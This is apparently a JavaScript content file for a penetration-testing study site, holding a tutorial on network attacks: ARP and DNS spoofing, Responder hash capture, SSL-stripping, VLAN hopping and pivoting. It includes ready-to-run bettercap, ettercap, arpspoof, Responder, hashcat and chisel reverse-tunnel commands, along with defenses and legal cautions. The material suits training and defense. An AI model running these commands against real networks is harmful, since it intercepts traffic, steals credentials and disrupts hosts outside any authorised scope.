window.PREP_SITE.registerTopic({
  id: 'eh-network',
  module: 'eh',
  title: 'Network Attacks',
  estimatedReadTime: '29 min',
  tags: ['ethical-hacking', 'security', 'pentest', 'network', 'mitm', 'arp-spoofing', 'sniffing', 'responder', 'pivoting'],
  sections: [

// ─────────────────────────────────────────────────────────────
{ id: 'tldr', title: '🎯 TL;DR', collapsible: false, html: `
<div class="callout danger">
  <div class="callout-title">⚠️ These techniques touch every host on the segment, not just your target</div>
  <p>Everything in this topic — ARP spoofing, DNS spoofing, Responder's LLMNR/NBT-NS poisoning, SSL-stripping — works by lying to a shared, trust-based network protocol. Once you turn one on, <strong>every device on that broadcast/collision domain sees the effect</strong>, not just an agreed-upon target. That makes these techniques both unusually powerful and unusually risky to run outside a lab: they can degrade or break connectivity for people who were never in scope. Only ever run them on your own isolated lab network (built in Foundations, Ethics &amp; Legal) or under a written Rules of Engagement that <em>explicitly</em> names network-wide ARP/DNS poisoning as an in-scope, authorized technique, ideally in an agreed low-traffic window.</p>
</div>
<p>This topic covers the classic <strong>Layer 2/3 attacks a tester runs after they already have a foothold on a network</strong> — plugged into a jack, joined to Wi-Fi, or sitting on a compromised host — and wants to turn that position into visibility or credentials. The throughline is a three-step pattern repeated with different tools: <strong>gain position</strong> (insert yourself into traffic flow), <strong>gain visibility</strong> (sniff what flows through you), <strong>take action</strong> (capture credentials, downgrade a connection, or move further into the network).</p>
<ul>
  <li><strong>Sniffing</strong> — <strong>Wireshark</strong>, <code>tcpdump</code>, and <code>tshark</code> capture and filter raw traffic once you can see it.</li>
  <li><strong>MITM &amp; ARP spoofing</strong> — <code>bettercap</code>, <code>ettercap</code>, and <code>arpspoof</code> poison ARP caches to insert yourself between a victim and the gateway on a switched network, where passive sniffing alone sees nothing useful.</li>
  <li><strong>DNS spoofing</strong> — once in a MITM position, answer a victim's DNS queries with an attacker-controlled address instead of the real one.</li>
  <li><strong><code>Responder</code></strong> — poisons legacy, unauthenticated Windows name-resolution broadcasts (LLMNR, NBT-NS, mDNS) to harvest NTLMv2 password hashes without any MITM position at all — often the single fastest win on an internal Windows network assessment.</li>
  <li><strong>SSL-stripping, VLAN hopping, and pivoting</strong> — a downgrade-HTTPS-to-HTTP concept (increasingly blunted by HSTS), a way to jump between VLANs that should be isolated, and the basic technique for using one compromised host as a relay into a network segment you can't reach directly.</li>
</ul>
<p><strong>Mantra:</strong> "Position, then visibility, then action — and every one of those three steps is loud enough to affect a whole network segment, so it only ever happens inside a lab or an explicit written scope."</p>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'what-why', title: '🧠 What & Why', html: `
<h3>Why LAN protocols are such an easy target</h3>
<p>Most of the protocols this topic abuses were designed in an era, and for an assumption, where every device on a local network could be trusted: <strong>ARP</strong> (Address Resolution Protocol) has no authentication at all — any host can claim to own any IP address, and everyone else just believes the most recent answer. <strong>LLMNR</strong> (Link-Local Multicast Name Resolution) and <strong>NBT-NS</strong> (NetBIOS Name Service) are legacy Windows fallback name-resolution protocols that broadcast "does anyone know this hostname?" to the whole segment when DNS fails to resolve a name — and, again, whichever host answers first wins, no authentication required. A single foothold on a flat, unsegmented network can often abuse this cooperative trust to see or intercept traffic that was never actually defended against a device already sitting on the "inside."</p>

<h3>Sniffing: what you can see depends on where you're standing</h3>
<p>On old hub-based networks, every frame was physically broadcast to every port, so passive sniffing saw everything for free. Modern switched networks only forward a frame out the port a destination MAC actually lives on — so passively sniffing a switch port shows you almost nothing interesting beyond your own traffic and broadcasts (ARP requests, DHCP, LLMNR/NBT-NS queries). To see someone else's unicast traffic on a switched network, you generally have to <strong>actively insert yourself into the traffic's path first</strong> — which is exactly what ARP spoofing does.</p>

<h3>MITM &amp; ARP spoofing: manufacturing a position</h3>
<p>A <strong>man-in-the-middle (MITM)</strong> position means traffic between two parties (commonly a victim and the default gateway) flows through the attacker's machine instead of directly between them, without either party noticing. <strong>ARP spoofing</strong> (also called ARP cache poisoning) is the classic way to manufacture that position on a LAN: the attacker sends forged ARP replies claiming "the gateway's IP now belongs to my MAC address" to the victim, and (for return traffic) "the victim's IP now belongs to my MAC address" to the gateway. Both parties' ARP caches are lied to; both now send frames destined for the other straight to the attacker, who forwards them onward so nothing appears to break — while quietly reading, and optionally modifying, everything that passes through.</p>

<h3>DNS spoofing: redirecting resolution once you're in the middle</h3>
<p><strong>DNS spoofing</strong> is a follow-on action once a MITM position already exists: instead of (or in addition to) just observing traffic, the attacker answers the victim's DNS queries with a fabricated IP address — typically pointing a real domain name at an attacker-controlled server used for credential phishing, serving malware, or further interception.</p>

<h3>Responder: no MITM position required</h3>
<p>Unlike ARP/DNS spoofing, <strong>Responder</strong> doesn't need to insert itself into existing traffic — it exploits a fallback behavior instead. When a Windows host tries to resolve a hostname and DNS fails (a mistyped share name, an offline server, a stale reference in a login script), it falls back to broadcasting an LLMNR or NBT-NS query asking "does anyone here know this name?" Responder simply answers "yes, that's me" for every such query, and when the requesting host then tries to authenticate to what it thinks is a legitimate file share, Responder's built-in rogue SMB/HTTP/MSSQL/FTP/LDAP servers capture the resulting NTLMv2 challenge-response hash. This is so reliable on default-configured Windows networks (LLMNR and NBT-NS are enabled out of the box) that it's frequently one of the very first things run on an internal/Active Directory engagement.</p>

<h3>SSL-stripping: downgrading HTTPS from a MITM position</h3>
<p>Once in a MITM position, an attacker sitting between a victim and the real HTTPS server can rewrite <code>https://</code> links in HTTP responses down to <code>http://</code>, so the victim's browser never negotiates TLS at all — the attacker holds the real HTTPS session to the server while relaying plaintext HTTP to the victim, reading everything in between. This is a real and historically effective technique, but its reliability has dropped sharply since browsers started shipping large built-in <strong>HSTS preload lists</strong>: for a preloaded domain (or any domain the victim's browser has already visited over HTTPS and remembered), the browser refuses to connect over plain HTTP at all, regardless of what the attacker rewrites. It remains relevant conceptually, and against non-preloaded or internal-only domains, but shouldn't be taught as a reliable break of modern HTTPS.</p>

<h3>VLAN hopping: attacking the segmentation itself</h3>
<p><strong>VLANs (Virtual LANs)</strong> are the standard way to segment a physical network into isolated logical broadcast domains — exactly the defense that limits how far ARP/DNS poisoning or Responder can reach. <strong>VLAN hopping</strong> is an attempt to break out of the VLAN an attacker's port was assigned to and reach a different one they shouldn't have access to, via switch misconfiguration rather than any credential or exploit.</p>

<h3>Pivoting: turning one foothold into reach</h3>
<p>Real networks are segmented specifically so that compromising one host doesn't hand over the whole environment. <strong>Pivoting</strong> is the technique of using a host you already control — one that happens to also have a network interface into a segment you can't reach directly — as a relay, tunneling further attack traffic through it. It's the bridge between "I have one box" and "I can reach the rest of the internal network," and it's the introduction here to a subject that Post-Exploitation &amp; Privilege Escalation builds on in much more depth.</p>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'mental-model', title: '🗺️ Mental Model', html: `
<h3>Position → Visibility → Action</h3>
<p>Nearly every technique in this topic is one step of the same three-step pattern. Keep this framing and the specific tools slot in naturally:</p>
<pre><code class="language-text">1. POSITION      2. VISIBILITY        3. ACTION
   (insert           (see what             (capture, redirect,
    yourself           flows through          or move further)
    into the path)      you)

   ARP spoof   →    Sniff (Wireshark/   →  DNS spoof, SSL-strip,
   (bettercap/         tcpdump/tshark)       credential capture
    ettercap/
    arpspoof)

   Responder: broadcasts a lie on the wire — no "position" step
   needed, because victims come to it via a broadcast fallback.

   VLAN hopping: attacks the segmentation that would otherwise
   contain steps 1–3 to a single VLAN.

   Pivoting: repeats steps 1–3 from a NEW vantage point, one hop
   deeper into the network, using an already-compromised host.
</code></pre>

<h3>Before and after ARP spoofing</h3>
<pre><code class="language-text">Normal traffic flow:
  Victim  &lt;───────────────────────────&gt;  Gateway

After ARP spoofing (attacker poisons BOTH caches):
  Victim  &lt;──&gt;  Attacker (sniffs / modifies)  &lt;──&gt;  Gateway

Both sides still believe they're talking directly to each other —
IP forwarding on the attacker's box is what keeps traffic flowing
and the illusion intact instead of just breaking connectivity.</code></pre>
<p>That last line matters operationally: forgetting to enable IP forwarding on the attacker machine turns an MITM into an accidental denial-of-service, since neither side's traffic reaches its real destination anymore.</p>

<h3>Where each technique sits on the network stack</h3>
<table>
  <thead><tr><th>Layer</th><th>What lives here</th><th>Attacks in this topic</th></tr></thead>
  <tbody>
    <tr><td>Layer 2 (Data Link)</td><td>MAC addresses, switches, VLANs, ARP</td><td>ARP spoofing, VLAN hopping (switch spoofing, double tagging)</td></tr>
    <tr><td>Layer 3 (Network)</td><td>IP addressing and routing</td><td>DNS spoofing (technically an application-layer protocol carried here for this purpose), pivoting/routing traffic between segments</td></tr>
    <tr><td>Layer 7 (Application)</td><td>HTTP/HTTPS, SMB, name-resolution protocols</td><td>SSL-stripping, LLMNR/NBT-NS/mDNS poisoning (Responder), SMB authentication capture</td></tr>
  </tbody>
</table>
<p>A useful pattern this reveals: the lower-layer attacks (ARP spoofing) create the position; the higher-layer attacks (DNS spoofing, SSL-strip, credential capture) are what you actually do with it. Responder is the exception that proves the rule — it operates by exploiting an application-layer fallback broadcast, which is why it needs no Layer 2 positioning step at all.</p>

<h3>Why this all maps onto the eh-foundations lifecycle</h3>
<p>These techniques sit squarely in the <strong>Exploitation</strong> and early <strong>Post-Exploitation</strong> stages of the engagement lifecycle from Foundations, Ethics &amp; Legal — they assume Reconnaissance and Scanning &amp; Enumeration already told you there's a reachable network segment worth standing on, and they exist to turn "I'm on this network" into "I have credentials" or "I can reach the next segment." Every technique here also puts <strong>availability</strong> (one leg of the CIA triad) at real risk — a botched ARP-spoof session without IP forwarding, or an aggressive VLAN-hopping attempt against a fragile switch, can knock real users offline — which is exactly why Rules of Engagement documents call these out by name rather than leaving them implied.</p>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'mechanics', title: '⚙️ Tools & Techniques', html: `
<h3>Sniffing: Wireshark, tcpdump, tshark</h3>
<p><strong>Capture filters</strong> (applied while capturing — BPF syntax, shared by <code>tcpdump</code> and <code>tshark -f</code>) discard traffic before it's even written to disk; <strong>display filters</strong> (Wireshark's filter bar, and <code>tshark -Y</code>) filter what's already captured and support much richer expressions.</p>
<pre><code class="language-bash"># tcpdump — capture filters (BPF syntax)
sudo tcpdump -i &lt;interface&gt;                          # capture everything, live
sudo tcpdump -i &lt;interface&gt; arp                       # only ARP frames (spot duplicate/poisoned replies)
sudo tcpdump -i &lt;interface&gt; host &lt;target&gt;              # only traffic to/from one host
sudo tcpdump -i &lt;interface&gt; port 53                    # only DNS traffic
sudo tcpdump -i &lt;interface&gt; 'host &lt;target&gt; and port 80' # combine with boolean operators
sudo tcpdump -i &lt;interface&gt; -w capture.pcap            # write to a file for later analysis in Wireshark

# tshark — Wireshark's CLI equivalent
tshark -i &lt;interface&gt; -f "port 53"                     # -f = capture filter (BPF, same syntax as tcpdump)
tshark -i &lt;interface&gt; -Y "dns"                         # -Y = display filter (Wireshark syntax, applied after capture)
tshark -i &lt;interface&gt; -w capture.pcapng                # write full capture to disk
tshark -r capture.pcapng -Y "http.request"              # re-read a saved capture and filter it</code></pre>
<p><strong>Wireshark display filters</strong> worth knowing by heart (same syntax used in <code>tshark -Y</code>):</p>
<pre><code class="language-text">arp                       — show only ARP traffic (repeated conflicting replies = a strong ARP-spoofing indicator)
dns                       — show only DNS queries/responses
http.request              — show only HTTP requests
tcp.port == 445           — show only SMB traffic
ip.addr == 192.168.56.10  — show only packets to/from one host
smb2 || smb               — show SMB traffic of either version (useful when hunting for Responder-style captures)</code></pre>

<h3>MITM &amp; ARP spoofing: arpspoof, ettercap, bettercap</h3>
<p>All three insert an attacker into the Victim ↔ Gateway path by lying to ARP. IP forwarding must be enabled on the attacker's machine first, or traffic simply stops flowing:</p>
<pre><code class="language-bash">sudo sysctl -w net.ipv4.ip_forward=1

# arpspoof (part of the dsniff suite) — needs TWO processes for a full bidirectional MITM:
sudo arpspoof -i &lt;interface&gt; -t &lt;target&gt; &lt;gateway&gt;   # tell the target "I am the gateway"
sudo arpspoof -i &lt;interface&gt; -t &lt;gateway&gt; &lt;target&gt;   # tell the gateway "I am the target" (return traffic)

# ettercap — text-mode, one command does both directions ("arp:remote" also
# relays to a real gateway when needed); the two /.../ groups are TARGET1 and TARGET2:
sudo ettercap -T -q -i &lt;interface&gt; -M arp:remote /&lt;target&gt;// /&lt;gateway&gt;//

# bettercap — modern, actively maintained, modular MITM framework; launch it,
# then drive it from its interactive shell:
sudo bettercap -iface &lt;interface&gt;
&gt; net.probe on
&gt; set arp.spoof.targets &lt;target&gt;
&gt; set arp.spoof.fullduplex true
&gt; arp.spoof on
&gt; net.sniff on
# The same commands can be saved as a .cap file and run non-interactively:
sudo bettercap -iface &lt;interface&gt; -caplet mitm.cap</code></pre>

<h3>DNS spoofing</h3>
<pre><code class="language-bash"># ettercap's dns_spoof plugin reads domain→IP mappings from /etc/ettercap/etter.dns.
# Add an entry (wildcards supported), e.g.:
#   example.lab      A   192.168.56.50
#   *.example.lab    A   192.168.56.50
# Then load the plugin alongside the ARP MITM with -P:
sudo ettercap -T -q -i &lt;interface&gt; -M arp:remote -P dns_spoof /&lt;target&gt;// /&lt;gateway&gt;//

# bettercap's dns.spoof module — set the domains to spoof and the address to redirect to:
&gt; set dns.spoof.domains example.lab,*.example.lab
&gt; set dns.spoof.address 192.168.56.50
&gt; dns.spoof on</code></pre>

<h3>Responder: LLMNR/NBT-NS/mDNS poisoning → NTLMv2 capture</h3>
<p>No MITM position required — Responder just listens for, and answers, broadcast name-resolution fallback queries:</p>
<pre><code class="language-bash">sudo responder -I &lt;interface&gt;         # start listening/poisoning on one interface
sudo responder -I &lt;interface&gt; -A       # analyze mode only — observe queries, poison nothing (safe recon)
sudo responder -I &lt;interface&gt; -w       # also start a rogue WPAD proxy server
sudo responder -I &lt;interface&gt; -f       # attempt to fingerprint the OS of requesting hosts

# Captured NTLMv2 challenge-response hashes are written to Responder's logs
# directory (commonly under /usr/share/responder/logs/ on Kali), one file per
# protocol/host, e.g. SMB-NTLMv2-SSP-192.168.56.20.txt

# Crack a captured hash offline with hashcat (mode 5600 = NTLMv2):
hashcat -m 5600 SMB-NTLMv2-SSP-192.168.56.20.txt wordlist.txt</code></pre>
<p>By default Responder answers File Server Service (SMB) requests; the flags above extend what it also does, but the poisoning itself (LLMNR/NBT-NS/mDNS) is on as soon as it's running against an interface.</p>

<h3>SSL-strip concept</h3>
<pre><code class="language-bash"># bettercap's built-in HTTPS proxy can attempt to strip TLS from a MITM'd
# session (the historical standalone "sslstrip" tool did this on its own):
&gt; set https.proxy.sslstrip true
&gt; https.proxy on</code></pre>
<p>Remember the caveat from What &amp; Why: this fails outright against any domain the victim's browser already trusts over HTTPS via HSTS (preloaded or previously visited) — treat it as a concept and a technique for non-preloaded/first-visit/internal targets, not a reliable universal HTTPS bypass in 2026.</p>

<h3>VLAN hopping concept</h3>
<ul>
  <li><strong>Switch spoofing</strong> — the attacker's host negotiates a trunk link by speaking Dynamic Trunking Protocol (DTP), impersonating a trunk-capable switch. If the connected port has DTP auto-negotiation enabled, it becomes a trunk carrying every VLAN configured on it, handing the attacker visibility across VLANs they were never assigned to.</li>
  <li><strong>Double tagging</strong> — the attacker crafts a frame with two stacked 802.1Q VLAN tags: an outer tag matching the trunk's native VLAN, and an inner tag naming the target VLAN. The first switch strips the (expected, untagged-equivalent) native-VLAN outer tag and forwards the frame on — still carrying the inner tag — straight into the target VLAN. It's a one-way, blind injection technique (no return path), and only works when the attacker's access port shares the trunk's native VLAN.</li>
</ul>

<h3>Intro to pivoting</h3>
<pre><code class="language-bash"># SSH dynamic port forward — turns a foothold host you control into a local
# SOCKS5 proxy, so any SOCKS-aware tool can reach the segment behind it:
ssh -D 1080 user@&lt;foothold-host&gt;

# proxychains.conf: add "socks5  127.0.0.1  1080", then prefix any tool:
proxychains nmap -sT -Pn 192.168.90.0/24

# Metasploit alternative — from an active Meterpreter session, add a route
# through it, then expose that route to external tools as a SOCKS proxy:
meterpreter&gt; run autoroute -s 192.168.90.0/255.255.255.0
msf6&gt; use auxiliary/server/socks_proxy

# chisel — reverse tunnel through restrictive firewalls/NAT (attacker listens,
# foothold host dials out and exposes a SOCKS proxy back to the attacker):
chisel server -p 8080 --reverse                  # on the attacker box
chisel client &lt;attacker-ip&gt;:8080 R:socks         # on the foothold host</code></pre>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'examples', title: '🧪 Worked Examples', html: `
<h3>Example 1 — From passive sniffing to an active ARP-spoof MITM (isolated lab network)</h3>
<p>Continuing the isolated host-only lab from Foundations, Ethics &amp; Legal, using a Kali attacker VM and a Metasploitable target VM, both pinned to the same lab-only network:</p>
<pre><code class="language-bash"># 1. Confirm the lab-only addressing before touching anything:
ip a
# → Kali: 192.168.56.101, Metasploitable: 192.168.56.102, "gateway" (lab router): 192.168.56.1

# 2. Passive sniff first — on a switched lab network this shows almost nothing
#    beyond broadcast traffic, confirming the "need a position" point from What &amp; Why:
sudo tcpdump -i eth1 -w passive.pcap
# → mostly ARP requests and DHCP noise; no useful unicast traffic between other hosts

# 3. Enable IP forwarding, then stand up a full bidirectional ARP-spoof MITM:
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth1 -t 192.168.56.102 192.168.56.1 &amp;
sudo arpspoof -i eth1 -t 192.168.56.1 192.168.56.102 &amp;

# 4. Sniff again, now that traffic actually flows through the attacker:
sudo tcpdump -i eth1 -w active-mitm.pcap host 192.168.56.102

# 5. Open active-mitm.pcap in Wireshark and filter to confirm interception:
#    display filter: ip.addr == 192.168.56.102 and tcp.port == 21
#    → cleartext FTP credentials from Metasploitable's vsftpd service are now visible,
#      proving the MITM position actually worked (never do step 3 outside a lab
#      or an explicit written scope — see Defenses &amp; Legal).</code></pre>

<h3>Example 2 — Capturing and cracking an NTLMv2 hash with Responder (lab AD segment)</h3>
<p>On a lab Active Directory network (e.g. a domain-joined Windows VM plus a domain controller, both on the isolated lab subnet), with LLMNR and NBT-NS left at their Windows-default enabled state:</p>
<pre><code class="language-bash"># 1. Start Responder listening on the lab interface — no MITM position needed:
sudo responder -I eth1

# 2. On the Windows lab VM, trigger a name-resolution fallback the way a real
#    user accidentally would — e.g. mistype a share name that doesn't exist:
#      \\\\fileserver-typo\\shared
# DNS fails to resolve "fileserver-typo", so Windows falls back to an LLMNR
# broadcast, which Responder answers, and Windows tries to authenticate to it.

# 3. Responder logs the captured NTLMv2 challenge-response:
#    /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.56.55.txt

# 4. Crack it offline against a wordlist (mode 5600 = NTLMv2 in hashcat):
hashcat -m 5600 SMB-NTLMv2-SSP-192.168.56.55.txt rockyou.txt
# → a weak lab-only password cracks in seconds, demonstrating why disabling
#   LLMNR/NBT-NS and enforcing SMB signing (Defenses &amp; Legal) both matter —
#   the first prevents the capture, the second prevents the hash being
#   relayed into a live session even if it IS captured.</code></pre>

<h3>Example 3 — Pivoting from a foothold host into a second, unreachable lab segment</h3>
<p>Assume a second isolated lab network exists that the Kali attacker VM cannot reach directly, but a compromised "jump" host (reachable from Kali) has a network interface into it:</p>
<pre><code class="language-bash"># 1. Confirm the jump host really does sit on both segments:
ssh user@192.168.56.50 "ip a"
# → shows eth0 on 192.168.56.0/24 (reachable from Kali) AND eth1 on
#   192.168.90.0/24 (the otherwise-unreachable inner lab segment)

# 2. Open a dynamic SOCKS proxy through it via SSH:
ssh -D 1080 user@192.168.56.50

# 3. Point proxychains at that local SOCKS proxy (in proxychains.conf):
#      socks5  127.0.0.1  1080

# 4. Scan the previously-unreachable inner segment through the tunnel:
proxychains nmap -sT -Pn 192.168.90.0/24
# → discovers hosts on 192.168.90.0/24 despite Kali having no direct route —
#   this is the same "one host becomes a relay" idea Post-Exploitation &amp;
#   Privilege Escalation later builds into full lateral-movement chains.</code></pre>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'interview-patterns', title: '🎤 Interview Patterns', html: `
<div class="qa-block">
<div class="qa-q">Walk me through how ARP spoofing creates a man-in-the-middle position.</div>
<div class="qa-a">
<p>ARP has no authentication, so any host can claim ownership of any IP address and the rest of the network simply believes the most recent reply. The attacker sends forged ARP replies to the victim claiming "the gateway's IP now maps to my MAC," and separately to the gateway claiming "the victim's IP now maps to my MAC." Both parties update their ARP caches and now send frames destined for each other straight to the attacker instead. As long as the attacker has enabled IP forwarding, it silently relays that traffic onward so the connection appears to work normally, while it reads (and can modify) everything passing through — that silent relay is what turns "I broke their connection" into "I'm secretly in the middle of it."</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">Why can't you just passively sniff a switched network to see another host's traffic?</div>
<div class="qa-a">
<p>Old hub-based networks physically broadcast every frame to every port, so passive sniffing worked for free. Modern switches learn which MAC address lives on which port and only forward unicast frames out that specific port, so a passive sniffer on a switch port mostly sees its own traffic plus broadcasts like ARP and DHCP — nothing interesting belonging to other hosts. To see someone else's traffic, you generally have to actively insert yourself into its path first, which is exactly what ARP spoofing (or a switch feature like port mirroring/SPAN, used defensively/legitimately) accomplishes.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">What is LLMNR/NBT-NS poisoning, and why is Responder so effective against Windows networks?</div>
<div class="qa-a">
<p>LLMNR and NBT-NS are legacy, unauthenticated fallback name-resolution protocols: when a Windows host can't resolve a hostname via DNS, it broadcasts a "does anyone know this name?" query to the local segment, and whichever host answers first is trusted — no MITM position or credentials required to abuse this. Responder listens for those broadcasts and simply answers "yes, that's me" for all of them, then uses its built-in rogue SMB/HTTP/MSSQL/FTP/LDAP servers to capture the NTLMv2 challenge-response hash the requesting host sends when it tries to authenticate. It's effective because LLMNR and NBT-NS are enabled by default on most Windows networks, and typos or stale references (a mistyped share name, an offline server in a login script) that trigger the fallback happen constantly in real environments — which is why it's often one of the very first things run on an internal Active Directory assessment.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">Is SSL-stripping still a practical attack in 2026?</div>
<div class="qa-a">
<p>Only in a narrower way than it used to be. SSL-stripping works by rewriting HTTPS links to HTTP from a MITM position, so the victim's browser never negotiates TLS at all while the attacker maintains the real HTTPS session to the server and relays plaintext to the victim. Modern browsers ship large built-in HSTS preload lists, and any browser that has previously visited a site over HTTPS remembers to require it going forward — for those domains, the browser simply refuses a plain-HTTP connection regardless of what an attacker rewrites, which makes classic SSL-stripping largely ineffective against major, preloaded, or previously-visited sites. It remains a real risk against domains that aren't preloaded, aren't HSTS-enabled, or that a victim is visiting for the very first time (e.g. some internal-only corporate applications) — so it's still worth understanding and testing for, just not treated as a universal HTTPS bypass anymore.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">What's the difference between the two VLAN hopping techniques, switch spoofing and double tagging?</div>
<div class="qa-a">
<p>Switch spoofing has the attacker's host speak Dynamic Trunking Protocol (DTP) to negotiate a trunk link directly with the switch, impersonating a trunk-capable device; if the port allows DTP auto-negotiation, it becomes a trunk carrying every VLAN on it, giving the attacker visibility across VLANs. Double tagging instead crafts a single frame with two stacked 802.1Q tags — an outer tag matching the trunk's native VLAN and an inner tag naming the target VLAN; the first switch strips the expected native-VLAN outer tag and forwards the frame on, still carrying the inner tag, straight into the target VLAN. Double tagging is more limited (it's one-way, with no return path, and only works if the attacker's port shares the trunk's native VLAN), while switch spoofing gives full bidirectional trunk access if it succeeds — but both are defeated by the same basic hygiene: disable DTP on non-trunk ports, and never leave user-facing ports on the native VLAN.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">What is pivoting, and what are the common ways to do it?</div>
<div class="qa-a">
<p>Pivoting is using a host you already control — one that also has network access into a segment you can't reach directly — as a relay to route further attack traffic into that otherwise-unreachable segment. Common mechanisms: an SSH dynamic port forward (<code>ssh -D</code>) turns the foothold host into a local SOCKS proxy that tools can be routed through via <code>proxychains</code>; inside Metasploit, an active session's <code>autoroute</code> adds a route through it and <code>auxiliary/server/socks_proxy</code> exposes that route to external tools; and tools like <code>chisel</code> establish reverse tunnels that work even through restrictive firewalls or NAT, where the foothold host dials out to the attacker rather than the other way around. It's the technique that turns "I compromised one machine" into "I can reach the rest of the internal network," and it's built on in much more depth in Post-Exploitation &amp; Privilege Escalation.</p>
</div>
</div>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'cheat-sheet', title: '📋 Cheat Sheet', html: `
<table>
  <thead><tr><th>Category</th><th>Tool / Technique</th><th>What it does / key command</th></tr></thead>
  <tbody>
    <tr><td>Sniffing</td><td>Wireshark</td><td>GUI packet capture &amp; analysis; display filters e.g. <code>arp</code>, <code>tcp.port == 445</code></td></tr>
    <tr><td>Sniffing</td><td><code>tcpdump</code></td><td>CLI capture, BPF capture filters; <code>tcpdump -i &lt;iface&gt; host &lt;ip&gt; -w cap.pcap</code></td></tr>
    <tr><td>Sniffing</td><td><code>tshark</code></td><td>Wireshark's CLI; <code>-f</code> = capture filter (BPF), <code>-Y</code> = display filter (Wireshark syntax)</td></tr>
    <tr><td>MITM / ARP spoofing</td><td><code>arpspoof</code></td><td>dsniff-suite ARP poisoner; <code>arpspoof -i &lt;iface&gt; -t &lt;target&gt; &lt;gateway&gt;</code> (run both directions)</td></tr>
    <tr><td>MITM / ARP spoofing</td><td><code>ettercap</code></td><td>Text-mode MITM + plugins; <code>ettercap -T -M arp:remote /&lt;target&gt;// /&lt;gateway&gt;//</code></td></tr>
    <tr><td>MITM / ARP spoofing</td><td><code>bettercap</code></td><td>Modern modular MITM framework; <code>arp.spoof on</code>, <code>net.sniff on</code>, caplet-driven</td></tr>
    <tr><td>DNS</td><td>DNS spoofing</td><td>ettercap <code>dns_spoof</code> plugin + <code>/etc/ettercap/etter.dns</code>, or bettercap's <code>dns.spoof</code> module</td></tr>
    <tr><td>Credential capture</td><td>Responder</td><td>LLMNR/NBT-NS/mDNS poisoner + rogue auth server; <code>responder -I &lt;iface&gt;</code> → captures NTLMv2</td></tr>
    <tr><td>Cracking</td><td>hashcat</td><td>Offline hash cracking; <code>hashcat -m 5600</code> = NTLMv2 mode, for Responder captures</td></tr>
    <tr><td>Downgrade</td><td>SSL-strip concept</td><td>Rewrite HTTPS→HTTP in a MITM position; largely defeated by HSTS preload on major sites today</td></tr>
    <tr><td>L2 segmentation bypass</td><td>VLAN hopping</td><td>Switch spoofing (DTP trunk negotiation) or double tagging (stacked 802.1Q tags) to reach another VLAN</td></tr>
    <tr><td>Lateral movement</td><td>Pivoting</td><td><code>ssh -D</code> + proxychains, Metasploit <code>autoroute</code>/<code>socks_proxy</code>, or <code>chisel</code> reverse tunnels</td></tr>
    <tr><td>Defense</td><td>Dynamic ARP Inspection (DAI)</td><td>Validates ARP replies against the DHCP snooping binding table; drops forged/poisoned ARP</td></tr>
    <tr><td>Defense</td><td>Port security</td><td>Limits/locks MAC addresses learned per switch port; disable unused ports</td></tr>
    <tr><td>Defense</td><td>Disable LLMNR / NBT-NS</td><td>Turn off via GPO (Multicast Name Resolution + NetBIOS over TCP/IP) — removes Responder's easiest win</td></tr>
    <tr><td>Defense</td><td>Network segmentation</td><td>VLANs + ACLs shrink the broadcast/blast radius; disable DTP, don't use native VLAN for user traffic</td></tr>
    <tr><td>Defense</td><td>SMB signing</td><td>Defeats NTLM relay — stops a captured/relayed hash from being turned into a live SMB session</td></tr>
    <tr><td>Legal must-have</td><td>Explicit written scope</td><td>Network-wide MITM/poisoning named explicitly in the RoE, or lab-only — never assumed in-scope by default</td></tr>
  </tbody>
</table>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'edge-cases', title: '⚠️ Defenses & Legal', html: `
<div class="callout danger">
  <div class="callout-title">⚠️ Authorization for these techniques must be explicit, not implied</div>
  <p>ARP spoofing, DNS spoofing, and LLMNR/NBT-NS poisoning affect every host on the broadcast/collision domain they're run against — including devices, users, and services that were never part of the agreed scope. Per the Rules of Engagement guidance in Foundations, Ethics &amp; Legal, a generic "network testing authorized" scope statement is <strong>not</strong> sufficient authorization for these — the RoE should name network-wide MITM/poisoning techniques explicitly, ideally with an agreed low-traffic testing window, precisely because they put availability (one leg of the CIA triad) at real risk for people outside the test. Outside of an engagement, keep every example in this topic on your own isolated lab network.</p>
</div>

<h3>Dynamic ARP Inspection (DAI)</h3>
<p>DAI is a switch feature that validates every ARP packet against a trusted binding table (typically built automatically by <strong>DHCP snooping</strong>, which records which IP was leased to which MAC on which port) and drops any ARP reply that doesn't match a known-good binding. This is the direct defense against <code>arpspoof</code>, <code>ettercap</code>, and <code>bettercap</code>'s ARP-spoofing modules — a forged "I am the gateway" reply from an attacker's MAC simply gets discarded by the switch before it ever reaches the victim.</p>

<h3>Port security</h3>
<p>Limiting (or locking to a single, known-good) the number of MAC addresses a switch port will learn, combined with administratively disabling unused ports, shrinks the attack surface for both ARP spoofing and VLAN-hopping attempts — an attacker who plugs in an unauthorized device either can't get a MAC address to stick at all, or trips a violation action (commonly shutting the port down) the moment they try.</p>

<h3>Disable LLMNR and NBT-NS (and don't rely on mDNS either)</h3>
<p>Because LLMNR/NBT-NS poisoning requires no MITM position and is one of the highest-yield techniques on a default-configured Windows network, the single highest-value defensive change here is simply turning both off via Group Policy — disable "Turn OFF Multicast Name Resolution" (which disables LLMNR) and disable NetBIOS over TCP/IP on client network adapters. Environments that still need name-resolution fallback should rely on a properly configured internal DNS instead of these broadcast-based, unauthenticated protocols.</p>

<h3>Network segmentation</h3>
<p>Smaller VLANs with enforced ACLs between them shrink the blast radius of every technique in this topic — ARP spoofing and Responder-style poisoning only reach hosts sharing the same broadcast domain, so segmentation directly limits how much an attacker's foothold can see. Segmentation also hardens against VLAN hopping specifically: disable DTP on all ports that don't need to be trunks, explicitly configure access ports as access (never auto), and never carry user traffic on the native VLAN of a trunk link.</p>

<h3>SMB signing</h3>
